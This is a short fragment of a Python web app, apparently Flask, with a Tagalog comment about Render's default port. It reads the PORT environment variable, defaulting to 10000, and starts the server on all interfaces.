    # Gagamit ng port 10000 para sa Render default environment
    port = int(os.environ.get('PORT', 10000))
    app.run(host="0.0.0.0", port=port)
